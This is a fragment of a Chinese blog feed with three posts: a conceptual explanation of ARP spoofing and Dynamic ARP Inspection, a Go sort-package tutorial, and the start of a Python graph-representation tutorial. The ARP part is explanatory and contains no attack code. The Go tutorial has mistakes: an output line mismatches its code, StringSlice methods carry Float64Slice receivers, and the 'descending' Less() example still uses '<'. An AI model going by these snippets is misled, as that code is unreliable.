<p>　　免费 ARP 的报文发出去是不希望收到回应的，只希望是起宣告作用；如果收到回应，则证明对方也使用自己目前使用的 IP 地址。当电脑检测到自己的IP地址跟其他电脑冲突时，它们会相互发送免费 ARP，用来提醒对方：你的IP地址跟我的冲突啦！冲突方之间可能会一直发送，直到有一边做出让步并修改IP地址（不同系统解决方法不同）。</p>
<h4 id="ARP-攻击与防御"><a href="#ARP-攻击与防御" class="headerlink" title="ARP 攻击与防御"></a>ARP 攻击与防御</h4><h5 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h5><p>　　ARP 欺骗攻击，考虑如下图的情景，在局域网里面，PC1、PC2、PC3三台主机共同连接到交换机 SW1 上面，对应 3 个接口 port 1/2/3。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/9/13-2.png" alt=""></p>
<p>　　PC1 需要跟 PC2 通信，通过 ARP 请求包询问 PC2 的 MAC 地址，由于采用广播形式，所以交换机将 ARP 请求包从接口 P1 广播到 P2 和 PC3。</p>
<p>　　PC2 根据询问信息，返回ARP单播回应包；此时 PC3 作为攻击者，没有返回 ARP 包，但是处于“监听”状态，为后续攻击做准备。</p>
<p>　　PC1 和 PC2 根据 ARP 问答，将各自的 ARP 映射信息（IP-MAC）存储在本地 ARP 缓存表。</p>
<p>　　交换机根据其学习机制，记录 MAC 地址对应的接口信息，存储在 CAM 缓存表（也称为 MAC 地址表）。交换机收到数据包时，会解封装数据包，根据目标 MAC 字段进行转发。</p>
<p>　　正常情况下，若收到的 ARP 请求不是给自己的，则直接丢弃；而攻击者 PC3 在监听之后，发起了 ARP 回应包：我就是 PC2（IP2-MAC3）。PC1 收到两个 ARP 回应包，内容分别如下：</p>
<ul>
<li><p>我是 PC2，我的 IP 地址是 IP2，我的 MAC 地址是 MAC2；</p>
</li>
<li><p>我是 PC2，我的 IP 地址是 IP2，我的 MAC 地址是 MAC3；</p>
</li>
</ul>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/9/13-3.png" alt=""></p>
<p>　　网络协议里各种表在处理缓存信息的方式要么是”先到先得”，要么”后到优先”。上面提到的 ARP 和 CAM 表，就是遵循”后到优先”原则。因此，作为攻击者，只要持续不停发出 ARP 欺骗包，就一定能够覆盖掉正常的ARP回应包。</p>
<p>　　根据数据封装规则，此后，当 PC1 要跟 PC2 进行通信时，无论是发送 PING 包还是发送其他数据，首先要查找 ARP 表，然后在网络层打上源目 IP，在链路层打上源目 MAC，然后将数据包发送给交换机。交换机收到之后对数据进行解封装，并且查看 CAM 表（基于目的 MAC 转发），由于目标 MAC3 对应 Port3，所以交换机自然而然将其转发给 PC3。就这样，PC1 本来要发给 PC2 的数据包，落到了攻击者 PC3 手里，这就完成了一次完整的 ARP 攻击。</p>
<h5 id="防御原理"><a href="#防御原理" class="headerlink" title="防御原理"></a>防御原理</h5><p>　　ARP攻击的罪魁祸首就是 ARP 欺骗包，处理这种欺骗行为的两个解决方法：</p>
<ul>
<li><p>保证电脑不接收欺骗包。</p>
</li>
<li><p>保证电脑收到欺骗包之后不相信。</p>
</li>
</ul>
<p>　　ARP防御可以在网络设备上实现，也可以在用户端实现，更可以在网络设备和用户端同时实现。局域网安全里比较常用的 ARP 防御技术被称为<strong>DAI（Dynamic ARP Inspection）- 动态ARP检测</strong>，原理可以简单概括：</p>
<ul>
<li><p>交换机记录每个接口对应的 IP 地址和 MAC，即 port&lt;-&gt;mac&lt;-&gt;ip，生成 DAI 检测表；</p>
</li>
<li><p>交换机检测每个接口发送过来的 ARP 回应包，根据 DAI 表判断是否违规，若违规则丢弃此数据包并对接口进行惩罚。</p>
</li>
</ul>
<p>　　DAI 是目前防御ARP攻击最有效的方法之一，但是大部分能支持这种动态ARP监测技术的交换机或者无线路由器，都基本是企业级的产品。简单的交换机不具备动态ARP监测技术。普通用户（电脑或手机）可以通过安装ARP防火墙做安全防御，可使用360安全卫士、腾讯电脑管家等软件来实现 ARP 攻击的防御。</p>
<p>参考资料：</p>
<p>[1] Fall K R, Stevens W R. TCP/IP illustrated, volume 1: The protocols[M]. addison-Wesley, 2011.</p>
<p>[2] <a href="http://www.pinginglab.net/article/72" target="_blank" rel="external">图解ARP协议（一）</a></p>
<p>[3] <a href="http://www.pinginglab.net/article/84" target="_blank" rel="external">图解ARP协议（二）ARP攻击篇</a></p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>ARP</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 标准库：sort 排序</title>
    <url>/2018/09/13/Golang%20%E6%A0%87%E5%87%86%E5%BA%93%EF%BC%9Asort%20%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<center>Golang 标准库 sort 排序学习。</center>

<a id="more"></a>
<p><br></p>
<p>　　sort包中实现了３种基本的排序算法：插入排序．快排和堆排序，但是这三种方式都只在sort包内部使用，所以用户在使用sort包进行排序时无需考虑使用那种排序方式，sort包会根据实际数据自动选择高效的排序算法。</p>
<h4 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h4><p>　　排序(接口)的三个要素： </p>
<ul>
<li>待排序元素个数 n ； </li>
<li>第 i 和第 j 个元素的比较函数 cmp ；</li>
<li>第 i 和 第 j 个元素的交换 swap ；</li>
</ul>
<p>　　sort 包中有一个 sort.Interface 接口，该接口有三个方法 <code>Len()</code>  、 <code>Less(i,j int)</code>和 <code>Swap(i,j int)</code> ，如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</div><div class="line">    <span class="comment">// Len方法返回集合中的元素个数</span></div><div class="line">    Len() <span class="keyword">int</span></div><div class="line">    <span class="comment">// Less方法报告索引i的元素是否比索引j的元素小</span></div><div class="line">    Less(i, j <span class="keyword">int</span>) <span class="keyword">bool</span></div><div class="line">    <span class="comment">// Swap方法交换索引i和j的两个元素</span></div><div class="line">    Swap(i, j <span class="keyword">int</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　任何实现了 <code>sort.Interface</code> 的类型（一般为集合），均可调用该包的 <code>Sort()</code> 方法进行排序。这些方法要求集合内列出元素的索引为整数。通用排序函数 <code>sort.Sort</code> 可以排序任何实现了 <code>sort.Inferface</code> 接口的对象(变量)。方法定义如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sort</span><span class="params">(data Interface)</span>	# 排序<span class="title">data</span>，不保证稳定性</span></div><div class="line"><span class="title">func</span> <span class="title">Stable</span><span class="params">(data Interface)</span>	# 排序<span class="title">data</span>，保证稳定性</div><div class="line"><span class="title">func</span> <span class="title">Reverse</span><span class="params">(data Interface)</span> <span class="title">Interface</span>	# <span class="title">Reverse</span>包装一个<span class="title">Interface</span>接口并返回一个新的<span class="title">Interface</span>接口，对该接口排序可生成递减序列</div><div class="line"><span class="title">func</span> <span class="title">IsSorted</span><span class="params">(data Interface)</span> <span class="title">bool</span>	# 报告<span class="title">data</span>是否已经被排序</div><div class="line"><span class="title">func</span> <span class="title">Search</span><span class="params">(n <span class="keyword">int</span>, f <span class="keyword">func</span>(<span class="keyword">int</span>)</span> <span class="title">bool</span>) <span class="title">int</span>	# 采用二分法搜索找到[0, <span class="title">n</span>)区间内最小的满足<span class="title">f</span><span class="params">(i)</span>==<span class="title">true</span>的值<span class="title">i</span></div></pre></td></tr></table></figure>
<h4 id="基本类型排序"><a href="#基本类型排序" class="headerlink" title="基本类型排序"></a>基本类型排序</h4><p>　　<code>sort</code> 包原生支持 <code>[]int</code> 、 <code>[]float64</code> 和 <code>[]string</code> 三种内建数据类型切片的排序操作，不仅提供了一些特殊的方法，还针对每种类型实现了相应的 <code>sort.Interface</code> 接口，即不必我们自己实现相关的 <code>Len()</code>、<code>Less()</code> 和 <code>Swap()</code> 方法。</p>
<h5 id="整型切片排序"><a href="#整型切片排序" class="headerlink" title="整型切片排序"></a>整型切片排序</h5><p>　　<code>sort</code> 包提供了针对整型切片的如下方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Ints</span><span class="params">(a []<span class="keyword">int</span>)</span>	# 将 <span class="title">a</span> 排序为递增顺序</span></div><div class="line"><span class="title">func</span> <span class="title">IntsAreSorted</span><span class="params">(a []<span class="keyword">int</span>)</span> <span class="title">bool</span>	# 判断 <span class="title">a</span> 是否已排序为递增顺序。</div><div class="line"><span class="title">func</span> <span class="title">SearchInts</span><span class="params">(a []<span class="keyword">int</span>, x <span class="keyword">int</span>)</span> <span class="title">int</span>	# 在递增顺序的 <span class="title">a</span> 中搜索 <span class="title">x</span>，返回 <span class="title">x</span> 的索引。如果查找不到，返回值是 <span class="title">x</span> 应该插入 <span class="title">a</span> 的位置（以保证 <span class="title">a</span> 的递增顺序），返回值可以是<span class="title">len</span><span class="params">(a)</span>。</div></pre></td></tr></table></figure>
<p>　　排序示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">s := []<span class="keyword">int</span>&#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>&#125;</div><div class="line">fmt.Println(<span class="string">"是否已排序："</span>, sort.IntsAreSorted(s))</div><div class="line">sort.Ints(s)</div><div class="line">fmt.Println(<span class="string">"元素 3 的升序排序后索引为："</span>, sort.SearchInts(s, <span class="number">3</span>))</div><div class="line">fmt.Println(<span class="string">"是否已排序："</span>, sort.IntsAreSorted(s))</div><div class="line">fmt.Println(s)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">是否已排序： false</div><div class="line">元素 1 的升序排序后索引为： 2</div><div class="line">是否已排序： true</div><div class="line">[1 2 3 4 5 6]</div></pre></td></tr></table></figure>
<p>　　除了使用特殊指定的函数外，还可以使用改装过的类型 <code>IntSclice</code> 类型， 然后直接调用它们对应的<code>Sort()</code>方法，因为这种类型也实现了 <code>sort.Interface</code> 接口：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> IntSlice []<span class="keyword">int</span></div><div class="line">    - <span class="function"><span class="keyword">func</span> <span class="params">(p IntSlice)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span></div><div class="line">    - <span class="title">func</span> <span class="params">(p IntSlice)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p IntSlice)</span> <span class="title">Search</span><span class="params">(x <span class="keyword">int</span>)</span> <span class="title">int</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p IntSlice)</span> <span class="title">Sort</span><span class="params">()</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p IntSlice)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></div></pre></td></tr></table></figure>
<p>　　排序示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">s := sort.IntSlice&#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>&#125;</div><div class="line">s.Sort()</div><div class="line">fmt.Println(s)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[1 2 3 4 5 6]</div></pre></td></tr></table></figure>
<h5 id="浮点型切片排序"><a href="#浮点型切片排序" class="headerlink" title="浮点型切片排序"></a>浮点型切片排序</h5><p>　　与整型切片排序相同，<code>sort</code> 包提供了针对浮点型切片的如下方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Float64s</span><span class="params">(a []<span class="keyword">float64</span>)</span></span></div><div class="line"><span class="title">func</span> <span class="title">Float64sAreSorted</span><span class="params">(a []<span class="keyword">float64</span>)</span> <span class="title">bool</span></div><div class="line"><span class="title">func</span> <span class="title">SearchFloat64s</span><span class="params">(a []<span class="keyword">float64</span>, x <span class="keyword">float64</span>)</span> <span class="title">int</span></div></pre></td></tr></table></figure>
<p>　　同样，也可以使用实现了 <code>sort.Interface</code> 接口的 <code>Float64Slice</code> 类型，并实现了其中的方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Float64Slice []<span class="keyword">float64</span></div><div class="line">    - <span class="function"><span class="keyword">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span></div><div class="line">    - <span class="title">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Search</span><span class="params">(x <span class="keyword">float64</span>)</span> <span class="title">int</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Sort</span><span class="params">()</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></div></pre></td></tr></table></figure>
<h5 id="字符串切片排序"><a href="#字符串切片排序" class="headerlink" title="字符串切片排序"></a>字符串切片排序</h5><p>　　与整型切片排序相同，<code>sort</code> 包提供了针对字符串切片的如下方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Strings</span><span class="params">(a []<span class="keyword">string</span>)</span></span></div><div class="line"><span class="title">func</span> <span class="title">StringsAreSorted</span><span class="params">(a []<span class="keyword">string</span>)</span> <span class="title">bool</span></div><div class="line"><span class="title">func</span> <span class="title">SearchStrings</span><span class="params">(a []<span class="keyword">string</span>, x <span class="keyword">string</span>)</span> <span class="title">int</span></div></pre></td></tr></table></figure>
<p>　　同样，也可以使用实现了 <code>sort.Interface</code> 接口的 <code>StringSlice</code> 类型，并实现了其中的方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> StringSlice []<span class="keyword">string</span></div><div class="line">    - <span class="function"><span class="keyword">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span></div><div class="line">    - <span class="title">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Search</span><span class="params">(x <span class="keyword">string</span>)</span> <span class="title">int</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Sort</span><span class="params">()</span></div><div class="line">    - <span class="title">func</span> <span class="params">(p Float64Slice)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></div></pre></td></tr></table></figure>
<h5 id="稳定排序"><a href="#稳定排序" class="headerlink" title="稳定排序"></a>稳定排序</h5><p>　　<code>Sort</code> 排序 <code>data</code>，它调用 1 次 <code>data.Len</code> 确定长度，调用 O(n*log(n)) 次 <code>data.Less</code> 和 <code>data.Swap</code>。<code>Sort()</code> 函数不能保证排序的稳定性（即不保证相等元素的相对次序不变）。</p>
<p>　　而 <code>Stable()</code> 函数排序 <code>data</code> 则可以保证排序的稳定性，相等元素的相对次序不变。它调用 1 次  <code>data.Len</code>，O(n*log(n)) 次 <code>data.Less</code>和 O(n*log(n)*log(n)) 次 <code>data.Swap</code>。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Stable</span><span class="params">(data Interface)</span></span></div></pre></td></tr></table></figure>
<h5 id="降序排列"><a href="#降序排列" class="headerlink" title="降序排列"></a>降序排列</h5><p>　　<code>sort</code> 包可以使用 <code>sort.Reverse(slice)</code> 来调换 <code>slice.Interface.Less</code>，也就是比较函数，所以，<code>int</code> 、<code>float64</code> 和 <code>string</code> 的逆序排序函数可以使用 <code>Reverse</code> 方法来实现。排序示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">s := sort.IntSlice&#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>&#125;</div><div class="line">sort.Sort(sort.Reverse(s))</div><div class="line">fmt.Println(s)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[6 5 4 3 2 1]</div></pre></td></tr></table></figure>
<h5 id="排序搜索"><a href="#排序搜索" class="headerlink" title="排序搜索"></a>排序搜索</h5><p>　　<code>Search</code> 函数采用二分法搜索找到 [0, n) 区间内最小的满足 <code>f(i)==true</code> 的值 i 。也就是说，<code>Search</code> 函数希望 f 在输入位于区间 [0, n) 的前面某部分（可以为空）时返回假，而在输入位于剩余至结尾的部分（可以为空）时返回真；<code>Search</code> 函数会返回满足 <code>f(i)==true</code> 的最小值 i 。如果没有该值，函数会返回 n。注意，未找到时的返回值不是 -1，这一点和 <code>strings.Index</code> 等函数不同。<code>Search</code> 函数只会用区间[0, n)内的值调用 f。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">x := <span class="number">11</span></div><div class="line">s := []<span class="keyword">int</span>&#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">45</span>&#125; <span class="comment">//注意：已经升序排序</span></div><div class="line">pos := sort.Search(<span class="built_in">len</span>(s), <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123; <span class="keyword">return</span> s[i] &gt;= x &#125;)</div><div class="line"><span class="keyword">if</span> pos &lt; <span class="built_in">len</span>(s) &amp;&amp; s[pos] == x &#123;</div><div class="line">	fmt.Println(x, <span class="string">"在s中的位置为："</span>, pos)</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	fmt.Println(<span class="string">"s不包含元素"</span>, x)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">11 在s中的位置为： 3</div></pre></td></tr></table></figure>
<p>　　如上，给定一个递增顺序的切片 s，调用 <code>Search(len(s), func(i int) bool { return S[i] &gt;= x })</code> 会返回 <code>data</code> 中最小的索引i满足 <code>s[i] &gt;= 11</code>。如果调用者想要知道 11 是否在切片里，它必须另外检查 <code>s[i] == 11</code>。搜索递减顺序的数据时，应使用 <code>&lt;=</code> 运算符代替 <code>&gt;=</code> 运算符。</p>
<h4 id="自定义类型的排序"><a href="#自定义类型的排序" class="headerlink" title="自定义类型的排序"></a>自定义类型的排序</h4><p>　　如上所述，只要自定义类型实现了 <code>sort.Interface</code> 接口及其方法，该类型的排序就可以通过使用 <code>sort.Sort(slice)</code> 实现。如下，学生成绩排序的例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"sort"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">type</span> StuScore <span class="keyword">struct</span> &#123;</div><div class="line">	name  <span class="keyword">string</span></div><div class="line">	score <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> StuScores []StuScore</div><div class="line"></div><div class="line"><span class="comment">//Len()</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s StuScores)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> <span class="built_in">len</span>(s)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//Less():成绩将有高到低排序</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s StuScores)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> s[i].score &lt; s[j].score</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//Swap()</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s StuScores)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">	s[i], s[j] = s[j], s[i]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	students := StuScores&#123;</div><div class="line">		&#123;<span class="string">"fzy"</span>, <span class="number">95</span>&#125;,</div><div class="line">		&#123;<span class="string">"qwe"</span>, <span class="number">91</span>&#125;,</div><div class="line">		&#123;<span class="string">"rty"</span>, <span class="number">96</span>&#125;,</div><div class="line">		&#123;<span class="string">"asd"</span>, <span class="number">90</span>&#125;&#125;</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"未排序:"</span>)</div><div class="line"></div><div class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> students &#123;</div><div class="line">		fmt.Println(v.name, <span class="string">":"</span>, v.score)</div><div class="line">	&#125;</div><div class="line">	fmt.Println()</div><div class="line">	<span class="comment">//StuScores已经实现了sort.Interface接口</span></div><div class="line">	sort.Sort(students)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"按成绩升序排序后:"</span>)</div><div class="line"></div><div class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> students &#123;</div><div class="line">		fmt.Println(v.name, <span class="string">":"</span>, v.score)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">未排序:</div><div class="line">fzy : 95</div><div class="line">qwe : 91</div><div class="line">rty : 96</div><div class="line">asd : 90</div><div class="line"></div><div class="line">按成绩升序排序后:</div><div class="line">asd : 90</div><div class="line">qwe : 91</div><div class="line">fzy : 95</div><div class="line">rty : 96</div></pre></td></tr></table></figure>
<p>　　上面的示例实现的是升序排序，如果要得到降序排序结果，其实只要修改 <code>Less()</code> 函数：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">//Less():成绩降序排序,只将小于号修改为大于号</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s StuScores)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> s[i].score &lt; s[j].score</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　当然，也可以使用 <code>Reverse函数</code> 来实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">将 sort.Sort(students) 更改为：</div><div class="line">sort.Sort(sort.Reverse(StuScores(students)))    // 按照成绩的降序排序</div></pre></td></tr></table></figure>
<p>参考资料：</p>
<p><a href="https://blog.csdn.net/gongpulin/article/details/80843921" target="_blank" rel="external">golang sort —— 排序算法</a></p>
<p><a href="https://www.cnblogs.com/wangchaowei/p/7802811.html" target="_blank" rel="external">go语言的排序、结构体排序</a></p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 数据结构-图</title>
    <url>/2018/09/11/Python%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE/</url>
    <content><![CDATA[<center>Python 算法基础之图结构表示方法总结。</center>

<a id="more"></a>
<p>　　图是一种重要的数据结构，它可以代表各种结构和系统，从运输网络到通信网络，从细胞核中的蛋白质相互作用到人类在线交互。</p>
<p>　　图是由顶点的有穷非空集合和顶点之间边的集合组成，通常表示为：G(V,E)，其中，G 表示一个图，V 是图 G 中的顶点的集合，E是图 G 中边的集合。如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/9/11-1.png" alt=""></p>
<p>　　下面将以如图所示的有向图为例进行说明 Python 中图结构的表示方法。</p>
<h4 id="邻接集合"><a href="#邻接集合" class="headerlink" title="邻接集合"></a>邻接集合</h4><p>　　对于图结构的实现来说，最直观的方式之一就是使用邻接列表。基本上就是针对每个节点设置一个邻接列表，可以使用集合、列表或者字典来实现。第一种是针对每个节点设置一个邻居集合。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># 将节点的编号赋值给相应的节点，方便操作</span></div><div class="line">a, b, c, d, e, f, g, h = range(<span class="number">8</span>)</div><div class="line">N = [</div><div class="line">    &#123;b, c, d, e, f&#125;,	<span class="comment"># a</span></div><div class="line">    &#123;c, e&#125;,	<span class="comment"># b</span></div><div class="line">    &#123;d&#125;,	<span class="comment"># c</span></div><div class="line">    &#123;e&#125;,	<span class="comment"># d</span></div><div class="line">    &#123;f&#125;,	<span class="comment"># e</span></div><div class="line">    &#123;c, g, h&#125;,	<span class="comment"># f</span></div><div class="line">    &#123;f, h&#125;,	<span class="comment"># g</span></div><div class="line">    &#123;f, g&#125;	<span class="comment"># h</span></div><div class="line">]    </div><div class="line"><span class="comment"># 列表中每个集合是每个节点邻接点集</span></div></pre></td></tr></table></figure>
<p>　　N(v) 代表 v 的邻接点集。测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>b <span class="keyword">in</span> N[a]	<span class="comment"># 节点 b 是否是 a 的邻居节点</span></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>len(N[a])	<span class="comment"># 节点 a 的出度</span></div><div class="line"><span class="number">5</span></div></pre></td></tr></table></figure>
<h4 id="邻接列表"><a href="#邻接列表" class="headerlink" title="邻接列表"></a>邻接列表</h4><p>　　与邻接集合类似，只是针对每个节点设置的是一个包含所有邻居的列表，而不是集合。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">a, b, c, d, e, f, g, h = range(<span class="number">8</span>)</div><div class="line">N = [ </div><div class="line">    [b, c, d, e, f],</div><div class="line">    [c, e],</div><div class="line">    [d],</div><div class="line">    [e],</div><div class="line">    [f],</div><div class="line">    [c, g, h],</div><div class="line">    [f, h],</div><div class="line">    [f, g]</div><div class="line">]</div></pre></td></tr></table></figure>
<h4 id="加权邻接字典"><a href="#加权邻接字典" class="headerlink" title="加权邻接字典"></a>加权邻接字典</h4><p>　　使用字典类型来代替集合或列表来表示邻接表。在字典类型中，每个邻居节点都会有一个键和一个额外的值，用于表示与其邻居节点（或出边）之间的关联性，如边的权重。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">a, b, c, d, e, f, g, h = range(<span class="number">8</span>)</div><div class="line">N = [</div><div class="line">    &#123;b: <span class="number">2</span>, c: <span class="number">1</span>, d: <span class="number">3</span>, e: <span class="number">9</span>, f: <span class="number">4</span>&#125;,	<span class="comment"># a</span></div><div class="line">    &#123;c: <span class="number">4</span>, e: <span class="number">3</span>&#125;,	<span class="comment"># b</span></div><div class="line">    &#123;d: <span class="number">8</span>&#125;,	<span class="comment"># c</span></div><div class="line">    &#123;e: <span class="number">7</span>&#125;,	<span class="comment"># d</span></div><div class="line">    &#123;f: <span class="number">5</span>&#125;, <span class="comment"># e</span></div><div class="line">    &#123;c: <span class="number">2</span>, g: <span class="number">2</span>, h: <span class="number">2</span>&#125;,	<span class="comment"># f</span></div><div class="line">    &#123;f: <span class="number">1</span>, h: <span class="number">6</span>&#125;,	<span class="comment"># g</span></div><div class="line">    &#123;f: <span class="number">9</span>, g: <span class="number">8</span>&#125;	<span class="comment"># h</span></div><div class="line">]</div></pre></td></tr></table></figure>
<p>　　测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>b <span class="keyword">in</span> N[a]	<span class="comment"># b 是否是 a 的邻居节点</span></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>len(N[f])	<span class="comment"># 度</span></div><div class="line"><span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>N[a][b]	<span class="comment"># 边(a, b)的权重</span></div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure>
<h4 id="邻接集字典"><a href="#邻接集字典" class="headerlink" title="邻接集字典"></a>邻接集字典</h4><p>　　以上图的表示方法都使用了list类型，其实，也可以使用嵌套的字典结构来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">N = &#123;<span class="string">'a'</span>:set(<span class="string">'bcdef'</span>),</div><div class="line">     <span class="string">'b'</span>:set(<span class="string">'ce'</span>),</div><div class="line">     <span class="string">'c'</span>:set(<span class="string">'d'</span>),</div><div class="line">     <span class="string">'d'</span>:set(<span class="string">'e'</span>),</div><div class="line">     <span class="string">'e'</span>:set(<span class="string">'f'</span>),</div><div class="line">     <span class="string">'f'</span>:set(<span class="string">'cgh'</span>),</div><div class="line">     <span class="string">'g'</span>:set(<span class="string">'fh'</span>),</div><div class="line">     <span class="string">'h'</span>:set(<span class="string">'fg'</span>)</div><div class="line">&#125;</div><div class="line"><span class="comment"># 如果省略set()构造器，用邻接字符串表示键值，工作方式相当于邻接列表</span></div></pre></td></tr></table></figure>
<p>　　当然，字典的值也可以使用列表来表示。测试：</p>
